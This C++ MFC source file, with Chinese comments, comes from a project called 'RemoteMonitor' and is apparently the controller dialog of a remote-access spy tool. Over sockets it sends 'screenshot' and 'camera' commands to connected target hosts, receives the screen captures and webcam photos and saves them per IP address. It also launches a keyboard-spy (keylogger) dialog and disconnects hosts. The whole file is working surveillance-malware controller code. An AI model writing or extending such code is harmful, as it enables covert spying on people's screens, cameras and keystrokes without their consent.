// HostDetailDlg.cpp: 实现文件
//

#include "pch.h"
#include "RemoteMonitor.h"
#include "HostDetailDlg.h"
#include "afxdialogex.h"
#include "RemoteMonitorDlg.h"
#include "KeyboardSpyDlg.h"
#include <json.h>


using namespace Json;

extern CRemoteMonitorDlg* pLogin;

void HostDetailDlg::ShowPicture(CString pic_path) {
	CImage image;
	int cx, cy;
	CRect rect;
	//根据路径载入图片  
	image.Load(pic_path);

	//获取图片的宽 高
	cx = image.GetWidth();
	cy = image.GetHeight();

	CWnd* pWnd = NULL;
	pWnd = GetDlgItem(IDC_STATIC_PICTURE);//获取控件句柄
	//获取Picture Control控件的客户区
	pWnd->GetClientRect(&rect);

	CDC* pDc = NULL;
	pDc = pWnd->GetDC();//获取picture control的DC  
	//设置指定设备环境中的位图拉伸模式
	int ModeOld = SetStretchBltMode(pDc->m_hDC, STRETCH_HALFTONE);
	//从源矩形中复制一个位图到目标矩形，按目标设备设置的模式进行图像的拉伸或压缩
	image.StretchBlt(pDc->m_hDC, rect, SRCCOPY);
	SetStretchBltMode(pDc->m_hDC, ModeOld);
	ReleaseDC(pDc);
}


// HostDetailDlg 对话框

IMPLEMENT_DYNAMIC(HostDetailDlg, CDialogEx)

HostDetailDlg::HostDetailDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG_HOST_DETAIL, pParent)
{

}

HostDetailDlg::~HostDetailDlg()
{
}

void HostDetailDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(HostDetailDlg, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON_RETURN, &HostDetailDlg::OnBnClickedButtonReturn)
	ON_BN_CLICKED(IDC_BUTTON_KEYBOARD_SPY, &HostDetailDlg::OnBnClickedButtonKeyboardSpy)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_SCREEN_SHOT, &HostDetailDlg::OnBnClickedButtonScreenShot)
	ON_BN_CLICKED(IDC_BUTTON_SCREEN_RECORDING, &HostDetailDlg::OnBnClickedButtonScreenRecording)
	ON_BN_CLICKED(IDC_BUTTON_DISCONNECT, &HostDetailDlg::OnBnClickedButtonDisconnect)
END_MESSAGE_MAP()


// HostDetailDlg 消息处理程序


void HostDetailDlg::OnBnClickedButtonReturn()
{
	CDialogEx::OnCancel();

	// TODO: 在此添加控件通知处理程序代码
}


BOOL HostDetailDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化

	hostDetailCaptionFont.CreatePointFont(150, _T("黑体"));
	GetDlgItem(IDC_STATIC_CAPTION)->SetFont(&hostDetailCaptionFont);


	CString ip_addr = pLogin->ip_addr_vec[(pLogin->host_index) - 1];
	CString port = pLogin->port_vec[(pLogin->host_index) - 1];
	BOOL connect_status = pLogin->connect_status_vec[(pLogin->host_index) - 1];


	GetDlgItem(IDC_STATIC_IP_DISPLAY)->SetWindowText(ip_addr);
	GetDlgItem(IDC_STATIC_PORT_DISPLAY)->SetWindowText(port);
	GetDlgItem(IDC_STATIC_CONNECT_STATUS_DISPLAY)->SetWindowText(connect_status?"已连接":"未连接");


	SetTimer(1, 100, NULL);					//定时器，100ms执行一次

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void HostDetailDlg::OnBnClickedButtonKeyboardSpy()
{
	// TODO: 在此添加控件通知处理程序代码

	INT_PTR nRes;
	KeyboardSpyDlg keyboardSpyDlg;
	nRes = keyboardSpyDlg.DoModal();

}


void HostDetailDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	switch (nIDEvent) {
	case 1: {
		CImage image;
		int cx, cy;
		CRect rect;
		//根据路径载入图片  
		char strPicPath[] = "src/windows.jpg";
		image.Load(strPicPath);

		//获取图片的宽 高
		cx = image.GetWidth();
		cy = image.GetHeight();

		CWnd* pWnd = NULL;
		pWnd = GetDlgItem(IDC_STATIC_PICTURE);//获取控件句柄
		//获取Picture Control控件的客户区
		pWnd->GetClientRect(&rect);

		CDC* pDc = NULL;
		pDc = pWnd->GetDC();//获取picture control的DC  
		//设置指定设备环境中的位图拉伸模式
		int ModeOld = SetStretchBltMode(pDc->m_hDC, STRETCH_HALFTONE);
		//从源矩形中复制一个位图到目标矩形，按目标设备设置的模式进行图像的拉伸或压缩
		image.StretchBlt(pDc->m_hDC, rect, SRCCOPY);
		SetStretchBltMode(pDc->m_hDC, ModeOld);
		ReleaseDC(pDc);

		KillTimer(1);
	}
	}
	

	CDialogEx::OnTimer(nIDEvent);
}


void HostDetailDlg::OnBnClickedButtonScreenShot()
{
	// TODO: 在此添加控件通知处理程序代码
	//点击按钮发送截图命令
	pLogin->sendLen_vec[pLogin->host_index - 1] = send(pLogin->clientSocket_vec[pLogin->host_index - 1], "screenshot", sizeof("screenshot"), 0);
	if (pLogin->sendLen_vec[pLogin->host_index - 1] == SOCKET_ERROR)
		MessageBox("send cmd error");
	//接收获取的截图数据的长度

	//创建File指针
	FILE* file = NULL;
	CTime time;
	time = CTime::GetCurrentTime();
	CString time_str = time.Format("%Y_%m_%d_%H_%M_%S");
	CString pic_path = "log\\" + pLogin->ip_addr_vec[pLogin->host_index - 1] + "\\" + time_str +"_screenshot.jpg";
	errno_t err = fopen_s(&file, pic_path, "wb");

	//获取截图数据流
	char recvData[4097];
	memset(recvData, 0, 4097);
	while (true)
	{
		int recv_len = recv(pLogin->clientSocket_vec[pLogin->host_index - 1], recvData, 4096, 0);

		if (!strncmp(recvData, "end", sizeof("end")))
		{
			cout << "end" << endl;
			break;
		}

		fwrite(recvData, recv_len, 1, file);
		memset(recvData, 0, 4097);
				
	}
	fclose(file);
	MessageBox("图片已成功保存在" + pic_path, "提示", MB_ICONINFORMATION | MB_OK);
	ShowPicture(pic_path);

}


void HostDetailDlg::OnBnClickedButtonScreenRecording()
{
	// TODO: 在此添加控件通知处理程序代码
	pLogin->sendLen_vec[pLogin->host_index - 1] = send(pLogin->clientSocket_vec[pLogin->host_index - 1], "camera", sizeof("camera"), 0);
	if (pLogin->sendLen_vec[pLogin->host_index - 1] == SOCKET_ERROR)
		MessageBox("send cmd error");
	//接收获取的截图数据的长度

	//创建File指针
	FILE* file = NULL;
	CTime time;
	time = CTime::GetCurrentTime();
	CString time_str = time.Format("%Y_%m_%d_%H_%M_%S");
	CString pic_path = "log\\" + pLogin->ip_addr_vec[pLogin->host_index - 1] + "\\" + time_str + "_camera.jpg";
	errno_t err = fopen_s(&file, pic_path, "wb");

	//获取截图数据流
	char recvData[4097];
	memset(recvData, 0, 4097);
	while (true)
	{
		int recv_len = recv(pLogin->clientSocket_vec[pLogin->host_index - 1], recvData, 4096, 0);

		if (!strncmp(recvData, "end", sizeof("end")))
		{
			cout << "end" << endl;
			
			break;
		}
		if (!strncmp(recvData, "no camera found!", sizeof("no camera found!"))){
			cout << "end" << endl;
			MessageBox("未寻找到目标主机摄像头！");
			return;
		}
		fwrite(recvData, recv_len, 1, file);
		memset(recvData, 0, 4097);

	}
	fclose(file);
	MessageBox("相片已成功保存在" + pic_path, "提示", MB_ICONINFORMATION | MB_OK);
	ShowPicture(pic_path);
}


void HostDetailDlg::OnBnClickedButtonDisconnect()
{
	// TODO: 在此添加控件通知处理程序代码
	bool disconnect_return = true;

	pLogin->sendLen_vec[pLogin->host_index - 1] = send(pLogin->clientSocket_vec[pLogin->host_index - 1], "exit", sizeof("exit"), 0);
	if (pLogin->sendLen_vec[pLogin->host_index - 1] == SOCKET_ERROR)
	{
		disconnect_return = false;
		MessageBox("send exit error");
	}

	closesocket(pLogin->clientSocket_vec[pLogin->host_index - 1]);

	//返回成功或者失败

	if (disconnect_return) {
		pLogin->connect_status_vec[pLogin->host_index - 1] = false;
		pLogin->RefreshHostList();
		MessageBox("成功断开连接", "提示", MB_ICONINFORMATION | MB_OK);
	}
	else {
		MessageBox("断开连接失败", "提示", MB_ICONWARNING | MB_OK);
	}

	CDialogEx::OnCancel();
}
